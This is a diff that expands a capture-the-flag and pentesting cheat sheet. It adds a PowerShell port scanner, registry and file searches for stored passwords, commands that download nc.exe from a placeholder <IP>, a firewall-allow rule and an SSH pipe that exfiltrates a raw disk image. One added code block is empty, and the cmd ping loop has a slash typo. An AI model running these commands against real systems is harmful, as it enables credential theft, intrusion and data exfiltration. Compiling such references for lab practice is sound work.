@@ -3,7 +3,7 @@ title: Yet Another CTF Playbook
 subtitle: Version 1
 author:
     - christalib
-date: June/July 2020
+date: June/September 2020
 titlepage: true
 titlepage-color: ffffff
 urlcolor: #370000
@@ -78,6 +78,13 @@ nmap <IP> -oN <FILE> # nmap file
 nmap <IP> -oA <FILE> # all formats
 ```
 
+
+## Powershell
+
+```powershell
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "Port
+$_ is open!"} 2>$null
+```
 
 ### Analysing results
 
@@ -183,6 +190,12 @@ file:
 
 ```sh
 sslscan <IP>
+```
+
+Website cloner:
+
+```sh
+wget -r -nH $URL
 ```
 
 #### Port 88
@@ -738,7 +751,7 @@ nmap --interactive
 
 General recon:
 
-```
+```cmd
 whoami
 hostname
 systeminfo
@@ -748,7 +761,7 @@ netstat
 
 Network discovery:
 
-```
+```cmd
 C:\> net view /all
 C:\> net view \\<Hostname>
 C:\> net users
@@ -757,17 +770,23 @@ C:\> net users /domain
 
 Ping scan:
 
-```
+```cmd
 C:\> for \L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
 ```
 
 Look for passwords:
 
-```
+```powershell
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 dir /s *pass* == *.config
 findstr /si password *.xml *.ini *.txt
+```
+
+Specific string search:
+
+```powershell
+ls -r C:\PATH -file | {Select-String -path $_ -pattern <SEARCH TERM>}
 ```
 
 #### Automation
@@ -1044,10 +1063,21 @@ find /tmp -type f -name ".*"
 
 ### Send files to remote hosts
 
+#### One-line web client
+
+```powershell
+```
+
 #### Powershell
 
 ```powershell
 Invoke-Webrequest -Uri <IP> -OutFile <DestFile>
+
+# Win 7
+(New-Object System.Net.WebClient).DownloadFile("http://<IP>/nc.exe", "c:\nc.exe")
+
+# Win 8 and later
+wget "http://<IP>/nc.exe" -outfile "c:\nc.exe"
 ```
 
 #### Impacket-smbserver
@@ -1055,6 +1085,17 @@ Invoke-Webrequest -Uri <IP> -OutFile <DestFile>
 ```sh
 impacket-smbserver secure . (-smb2support)
 copy \\<IP>\secure\<FILE>
+```
+
+## Firewall
+
+```powershell
+# Get Firewall rules
+Get-NetFirewallRule -all | Out-GridView
+Get-NetFirewallRule -all | Export-csv <file.csv>
+
+# Add a Firewall rule
+New-NetFirewallRule -Action Allow -DisplayName <NAME> -RemoteAddress <IP>
 ```
 
 ## Pivoting
@@ -1199,6 +1240,16 @@ Run as dictionnary mode, try to decompress the target:
 
 ```sh
 fcrackzip -u -D -p <Wordlist> <FILE>
+```
+
+# Exfiltration
+
+Encrypted Exfiltration channel:
+
+*Exfiltrate the contents of an image via SSH to another machine, compressing (-C) the content.*
+
+```sh
+dd if=/dev/rdisk0s1s2s bs=65536 conv=noerror,sync | ssh -C user@<IP> "cat /tmp/image.dd"
 ```
 
 # Custom Scripts
